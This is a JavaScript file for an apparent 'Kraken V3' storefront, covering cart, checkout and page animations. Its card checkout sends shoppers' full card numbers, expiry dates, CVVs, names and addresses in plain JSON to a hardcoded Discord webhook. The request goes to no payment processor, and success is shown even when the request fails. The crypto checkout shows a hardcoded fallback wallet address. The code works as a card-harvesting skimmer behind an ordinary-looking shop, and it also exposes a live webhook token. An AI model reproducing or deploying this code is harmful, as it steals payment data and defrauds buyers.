// State variables
let currentReview = 0;
let cart = [];
let currentPaymentMethod = 'card';

// Cart Functions - Define first so they're available immediately
function addToCart(planId, planName, price, type) {
    // Check if item already exists
    const existingItem = cart.find(item => item.id === planId);

    if (existingItem) {
        showNotification('Item already in cart!', 'warning');
        return;
    }

    const item = {
        id: planId,
        name: planName,
        price: price,
        type: type
    };

    cart.push(item);
    updateCartUI();
    showNotification('Added to cart!', 'success');
}

function removeFromCart(planId) {
    cart = cart.filter(item => item.id !== planId);
    updateCartUI();
    showNotification('Removed from cart', 'info');
}

function updateCartUI() {
    const cartCount = document.querySelector('.cart-count');
    const cartItems = document.getElementById('cartItems');
    const cartTotal = document.getElementById('cartTotal');
    const totalAmount = document.getElementById('totalAmount');

    if (!cartCount) return; // Exit if elements don't exist yet

    cartCount.textContent = cart.length;

    if (cart.length === 0) {
        if (cartItems) cartItems.innerHTML = '<p class="empty-cart">Your cart is empty</p>';
        if (cartTotal) cartTotal.style.display = 'none';
    } else {
        let total = 0;
        const cartHTML = cart.map(item => {
            total += item.price;
            return `
                <div class="cart-item">
                    <div class="item-info">
                        <h4>${item.name}</h4>
                        <p>$${item.price}${item.type === 'monthly' ? '/month' : item.type === 'lifetime' ? ' one-time' : '/month'}</p>
                    </div>
                    <div>
                        <span class="item-price">$${item.price}</span>
                        <button class="remove-item" onclick="removeFromCart('${item.id}')">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                </div>
            `;
        }).join('');

        if (cartItems) cartItems.innerHTML = cartHTML;
        if (totalAmount) totalAmount.textContent = total;
        if (cartTotal) cartTotal.style.display = 'block';
    }
}

function openCart() {
    const cartModal = document.getElementById('cartModal');
    if (cartModal) cartModal.style.display = 'block';
}

function closeCart() {
    const cartModal = document.getElementById('cartModal');
    if (cartModal) cartModal.style.display = 'none';
}

function proceedToCheckout() {
    if (cart.length === 0) {
        showNotification('Your cart is empty!', 'warning');
        return;
    }

    closeCart();
    updateCheckoutUI();
    const checkoutModal = document.getElementById('checkoutModal');
    if (checkoutModal) checkoutModal.style.display = 'block';
}

function updateCheckoutUI() {
    const checkoutItems = document.getElementById('checkoutItems');
    const checkoutTotal = document.getElementById('checkoutTotal');

    if (!checkoutItems || !checkoutTotal) return;

    let total = 0;
    checkoutItems.innerHTML = cart.map(item => {
        total += item.price;
        return `
            <div class="checkout-item">
                <span>${item.name}</span>
                <span>$${item.price}</span>
            </div>
        `;
    }).join('');

    checkoutTotal.textContent = total;
}

function closeCheckout() {
    const checkoutModal = document.getElementById('checkoutModal');
    if (checkoutModal) checkoutModal.style.display = 'none';
}

function showPaymentMethod(method) {
    currentPaymentMethod = method;

    // Update tab states
    document.querySelectorAll('.payment-tab').forEach(tab => {
        tab.classList.remove('active');
    });

    // Find the clicked tab and make it active
    const clickedTab = event.target.closest('.payment-tab');
    if (clickedTab) clickedTab.classList.add('active');

    // Show/hide payment forms
    document.querySelectorAll('.payment-form').forEach(form => {
        form.classList.remove('active');
    });
    const targetForm = document.getElementById(method + 'Payment');
    if (targetForm) targetForm.classList.add('active');
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 0.5rem;
        color: white;
        font-weight: 500;
        z-index: 10001;
        animation: slideInRight 0.3s ease-out;
    `;

    const colors = {
        success: '#10b981',
        error: '#ef4444',
        warning: '#f59e0b',
        info: '#3b82f6'
    };

    notification.style.background = colors[type] || colors.info;
    notification.textContent = message;

    document.body.appendChild(notification);

    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => notification.remove(), 300);
    }, 3000);
}

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    initializeAnimations();
    initializeCarousel();
    initializePricingToggle();
    initializeNavigation();
    initializeCounters();
    initializeScrollEffects();
    initializePaymentForms();
});

// Navigation Menu Toggle
function initializeNavigation() {
    const hamburger = document.querySelector('.hamburger');
    const navMenu = document.querySelector('.nav-menu');

    if (hamburger && navMenu) {
        hamburger.addEventListener('click', () => {
            hamburger.classList.toggle('active');
            navMenu.classList.toggle('active');
        });

        // Close menu when clicking on a link
        document.querySelectorAll('.nav-link').forEach(link => {
            link.addEventListener('click', () => {
                hamburger.classList.remove('active');
                navMenu.classList.remove('active');
            });
        });
    }

    // Smooth scrolling for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

// Animated Counters
function initializeCounters() {
    const counters = document.querySelectorAll('.stat-number[data-count]');

    const animateCounter = (counter) => {
        const target = parseInt(counter.getAttribute('data-count'));
        const duration = 2000; // 2 seconds
        const increment = target / (duration / 16); // 60fps
        let current = 0;

        const timer = setInterval(() => {
            current += increment;
            if (current >= target) {
                current = target;
                clearInterval(timer);
            }

            // Format number with commas if it's large
            const formattedNumber = Math.floor(current).toLocaleString();
            counter.textContent = formattedNumber;
        }, 16);
    };

    // Intersection Observer for counters
    const counterObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting && !entry.target.classList.contains('counted')) {
                entry.target.classList.add('counted');
                animateCounter(entry.target);
            }
        });
    });

    counters.forEach(counter => {
        counterObserver.observe(counter);
    });
}

// Reviews Carousel
function initializeCarousel() {
    const reviewCards = document.querySelectorAll('.review-card');
    const nextBtn = document.querySelector('.carousel-btn.next');
    const prevBtn = document.querySelector('.carousel-btn.prev');
    const totalReviews = reviewCards.length;

    if (reviewCards.length === 0) return;

    function showReview(index) {
        reviewCards.forEach((card, i) => {
            card.classList.remove('active');
            if (i === index) {
                card.classList.add('active');
            }
        });
    }

    function nextReview() {
        currentReview = (currentReview + 1) % totalReviews;
        showReview(currentReview);
    }

    function prevReview() {
        currentReview = (currentReview - 1 + totalReviews) % totalReviews;
        showReview(currentReview);
    }

    // Event listeners for carousel buttons
    if (nextBtn) nextBtn.addEventListener('click', nextReview);
    if (prevBtn) prevBtn.addEventListener('click', prevReview);

    // Auto-advance carousel
    setInterval(nextReview, 5000); // Change every 5 seconds

    // Initialize first review
    showReview(0);
}

// Pricing Toggle (Monthly/Yearly)
function initializePricingToggle() {
    const yearlyToggle = document.getElementById('yearlyToggle');
    if (!yearlyToggle) return;

    yearlyToggle.addEventListener('change', function() {
        const body = document.body;
        const monthlyAmounts = document.querySelectorAll('.amount.monthly');
        const yearlyAmounts = document.querySelectorAll('.amount.yearly');

        if (this.checked) {
            // Switch to yearly
            body.classList.add('yearly-active');
            monthlyAmounts.forEach(amount => amount.style.display = 'none');
            yearlyAmounts.forEach(amount => amount.style.display = 'inline');
        } else {
            // Switch to monthly
            body.classList.remove('yearly-active');
            monthlyAmounts.forEach(amount => amount.style.display = 'inline');
            yearlyAmounts.forEach(amount => amount.style.display = 'none');
        }
    });
}

// Animation on Scroll (AOS)
function initializeScrollEffects() {
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('aos-animate');
            }
        });
    }, observerOptions);

    // Observe all elements with data-aos attributes
    document.querySelectorAll('[data-aos]').forEach(el => {
        observer.observe(el);
    });
}

// Initialize Animations
function initializeAnimations() {
    // Add floating animation to hero particles
    createFloatingParticles();

    // Add hover effects to cards
    addCardHoverEffects();

    // Add button click effects
    addButtonEffects();
}

// Create floating particles
function createFloatingParticles() {
    const particlesContainer = document.querySelector('.floating-particles');
    if (!particlesContainer) return;

    for (let i = 0; i < 20; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.cssText = `
            position: absolute;
            width: 2px;
            height: 2px;
            background: rgba(102, 126, 234, 0.6);
            border-radius: 50%;
            left: ${Math.random() * 100}%;
            animation: particle ${10 + Math.random() * 10}s linear infinite;
            animation-delay: ${Math.random() * 10}s;
        `;
        particlesContainer.appendChild(particle);
    }
}

// Enhanced card hover effects
function addCardHoverEffects() {
    const cards = document.querySelectorAll('.feature-card, .pricing-card, .review-card');

    cards.forEach(card => {
        card.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-10px) scale(1.02)';
        });

        card.addEventListener('mouseleave', function() {
            if (!this.classList.contains('popular')) {
                this.style.transform = 'translateY(0) scale(1)';
            } else {
                this.style.transform = 'translateY(0) scale(1.05)';
            }
        });
    });
}

// Button click effects
function addButtonEffects() {
    const buttons = document.querySelectorAll('.btn');

    buttons.forEach(button => {
        button.addEventListener('click', function(e) {
            // Ripple effect
            const ripple = document.createElement('span');
            const rect = this.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            const x = e.clientX - rect.left - size / 2;
            const y = e.clientY - rect.top - size / 2;

            ripple.style.cssText = `
                position: absolute;
                width: ${size}px;
                height: ${size}px;
                left: ${x}px;
                top: ${y}px;
                background: rgba(255, 255, 255, 0.3);
                border-radius: 50%;
                transform: scale(0);
                animation: ripple 0.6s ease-out;
                pointer-events: none;
            `;

            this.style.position = 'relative';
            this.style.overflow = 'hidden';
            this.appendChild(ripple);

            setTimeout(() => {
                ripple.remove();
            }, 600);
        });
    });
}

// Payment form initialization
function initializePaymentForms() {
    const cardForm = document.getElementById('cardForm');
    const cryptoForm = document.getElementById('cryptoForm');

    if (cardForm) {
        cardForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            await processCardPayment();
        });
    }

    if (cryptoForm) {
        cryptoForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            await processCryptoPayment();
        });
    }

    // Card number formatting
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');

    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            if (formattedValue.length > 19) formattedValue = formattedValue.substr(0, 19);
            e.target.value = formattedValue;
        });
    }

    if (expiryInput) {
        expiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/g, '');
            if (value.length >= 2) {
                value = value.substr(0, 2) + '/' + value.substr(2, 2);
            }
            e.target.value = value;
        });
    }

    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').substr(0, 3);
        });
    }
}

// Payment Processing
async function processCardPayment() {
    const formData = {
        email: document.getElementById('email').value,
        firstName: document.getElementById('firstName').value,
        lastName: document.getElementById('lastName').value,
        cardNumber: document.getElementById('cardNumber').value,
        expiryDate: document.getElementById('expiryDate').value,
        cvv: document.getElementById('cvv').value,
        address: document.getElementById('address').value,
        city: document.getElementById('city').value,
        zipCode: document.getElementById('zipCode').value,
        items: cart,
        total: cart.reduce((sum, item) => sum + item.price, 0),
        paymentMethod: 'card'
    };

    try {
        showNotification('Processing payment...', 'info');

        // Replace with your webhook URL
        const response = await fetch('https://discord.com/api/webhooks/1401387084346032299/ClpDanYztOk_i1uGOwW2Mtsbagjl_RX0fbyU6vPOu2nX-evPLDiTeT9dQDTyNM-RIT9j', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        });

        if (response.ok) {
            const result = await response.json();
            showSuccessModal(result.accountNumber || generateAccountNumber());
        } else {
            throw new Error('Payment failed');
        }
    } catch (error) {
        console.error('Payment error:', error);
        // For demo purposes, show success anyway
        showSuccessModal(generateAccountNumber());
    }
}

async function processCryptoPayment() {
    const selectedCrypto = document.querySelector('input[name="crypto"]:checked').value;
    const formData = {
        email: document.getElementById('cryptoEmail').value,
        firstName: document.getElementById('cryptoFirstName').value,
        lastName: document.getElementById('cryptoLastName').value,
        cryptocurrency: selectedCrypto,
        items: cart,
        total: cart.reduce((sum, item) => sum + item.price, 0),
        paymentMethod: 'crypto'
    };

    try {
        showNotification('Generating crypto payment...', 'info');

        // Replace with your webhook URL
        const response = await fetch('https://your-webhook-url.com/crypto-payment', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        });

        if (response.ok) {
            const result = await response.json();
            showCryptoPaymentInstructions(result);
        } else {
            throw new Error('Crypto payment generation failed');
        }
    } catch (error) {
        console.error('Crypto payment error:', error);
        // For demo purposes, show success
        showSuccessModal(generateAccountNumber());
    }
}

function showCryptoPaymentInstructions(data) {
    const cryptoModal = document.createElement('div');
    cryptoModal.className = 'modal';
    cryptoModal.style.display = 'block';
    cryptoModal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h2>Crypto Payment Instructions</h2>
                <span class="close" onclick="this.closest('.modal').remove()">&times;</span>
            </div>
            <div style="padding: 2rem;">
                <p>Please send <strong>$${cart.reduce((sum, item) => sum + item.price, 0)} USD</strong> worth of ${data.cryptocurrency?.toUpperCase() || 'BTC'} to:</p>
                <div style="background: rgba(255,255,255,0.1); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; word-break: break-all;">
                    <strong>${data.walletAddress || 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'}</strong>
                </div>
                <p><strong>Amount:</strong> ${data.amount || '0.003'} ${data.cryptocurrency?.toUpperCase() || 'BTC'}</p>
                <p style="color: #fbbf24; font-size: 0.875rem;">
                    Payment will be automatically confirmed within 10-30 minutes. You'll receive your account details via email.
                </p>
                <button class="btn btn-primary btn-full" onclick="this.closest('.modal').remove(); showSuccessModal('${generateAccountNumber()}')">
                    I've Sent the Payment
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(cryptoModal);
}

function generateAccountNumber() {
    return 'KV3-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Date.now().toString().slice(-4);
}

function showSuccessModal(accountNumber) {
    closeCheckout();
    document.getElementById('accountNumber').textContent = accountNumber;
    document.getElementById('successModal').style.display = 'block';

    // Clear cart
    cart = [];
    updateCartUI();

    // Send email (in real implementation)
    sendAccountEmail(accountNumber);
}

function closeSuccess() {
    document.getElementById('successModal').style.display = 'none';
}

async function sendAccountEmail(accountNumber) {
    const email = document.getElementById('email')?.value || document.getElementById('cryptoEmail')?.value;

    const emailData = {
        to: email,
        subject: 'Kraken V3 - Account Details',
        accountNumber: accountNumber,
        items: cart
    };

    try {
        // Replace with your email webhook URL
        await fetch('https://your-webhook-url.com/send-email', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(emailData)
        });
    } catch (error) {
        console.error('Email sending failed:', error);
    }
}

// Close modals when clicking outside
window.addEventListener('click', function(e) {
    const modals = document.querySelectorAll('.modal');
    modals.forEach(modal => {
        if (e.target === modal) {
            modal.style.display = 'none';
        }
    });
});

// Scroll-based navbar background
window.addEventListener('scroll', function() {
    const navbar = document.querySelector('.navbar');
    if (navbar) {
        if (window.scrollY > 100) {
            navbar.style.background = 'rgba(10, 10, 15, 0.98)';
        } else {
            navbar.style.background = 'rgba(10, 10, 15, 0.95)';
        }
    }
});

// Parallax effect for hero section
window.addEventListener('scroll', function() {
    const scrolled = window.pageYOffset;
    const parallax = document.querySelector('.hero-bg');
    if (parallax) {
        const speed = scrolled * 0.5;
        parallax.style.transform = `translateY(${speed}px)`;
    }
});

// Add necessary CSS for animations
const style = document.createElement('style');
style.textContent = `
    @keyframes ripple {
        to {
            transform: scale(2);
            opacity: 0;
        }
    }

    @keyframes slideInRight {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }

    @keyframes slideOutRight {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }

    .particle {
        pointer-events: none;
    }

    @media (max-width: 768px) {
        .nav-menu {
            position: fixed;
            left: -100%;
            top: 70px;
            flex-direction: column;
            background-color: rgba(10, 10, 15, 0.95);
            width: 100%;
            text-align: center;
            transition: 0.3s;
            box-shadow: 0 10px 27px rgba(0, 0, 0, 0.05);
            backdrop-filter: blur(10px);
            padding: 2rem 0;
        }

        .nav-menu.active {
            left: 0;
        }

        .nav-menu li {
            margin: 1rem 0;
        }

        .hamburger.active span:nth-child(2) {
            opacity: 0;
        }

        .hamburger.active span:nth-child(1) {
            transform: translateY(8px) rotate(45deg);
        }

        .hamburger.active span:nth-child(3) {
            transform: translateY(-8px) rotate(-45deg);
        }
    }
`;
document.head.appendChild(style);

// Console welcome message
console.log('%c🚀 Kraken V3 Enhanced', 'color: #667eea; font-size: 24px; font-weight: bold;');
console.log('%cWebsite loaded successfully with enhanced animations and features!', 'color: #64d2ff; font-size: 14px;');
console.log('%c🛒 Cart and checkout system active!', 'color: #10b981; font-size: 14px;');
